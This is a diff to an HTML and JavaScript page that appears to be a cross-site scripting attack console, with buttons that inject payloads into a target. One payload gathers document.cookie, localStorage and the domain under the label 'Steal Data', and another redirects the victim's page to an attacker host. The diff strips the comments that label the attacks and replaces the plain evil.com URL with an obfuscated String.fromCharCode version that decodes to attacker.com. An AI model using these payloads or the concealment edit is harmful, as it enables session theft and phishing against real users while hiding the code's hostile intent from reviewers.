@@ -113,7 +113,7 @@
             <button class="btn-open" onclick="openTarget()">1. Open Target</button>
             <button class="btn-alert" onclick="sendAlert()">2. XSS Alert</button>
             <button class="btn-steal" onclick="sendSteal()">3. Steal Data</button>
-            <button class="btn-phish" onclick="sendPhish()">4. Redirect to evil.com</button>
+            <button class="btn-phish" onclick="sendPhish()">4. Redirect</button>
         </div>
 
         <div class="status" id="status"></div>
@@ -215,13 +215,12 @@ function sendPayload(xss) {
     }
 }
 
-// Attack 1: Simple Alert
 function sendAlert() {
     showStatus('Sending XSS alert...');
     sendPayload('alert(document.domain)');
 }
 
-// Attack 2: Steal Data
+
 function sendSteal() {
     showStatus('Stealing data...');
     var xss = 'var d={domain:document.domain,cookies:document.cookie,localStorage:JSON.stringify(localStorage),bootstrap:window.bootstrap};';
@@ -229,10 +228,9 @@ function sendSteal() {
     sendPayload(xss);
 }
 
-// Attack 3: Redirect iframe to evil.com
 function sendPhish() {
-    showStatus('Redirecting iframe to evil.com...');
-    var xss = 'location.href="https://evil.com"';
+    showStatus('Redirecting to attacker.com...');
+    var xss = 'location.href=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109)';
     sendPayload(xss);
 }
 </script>
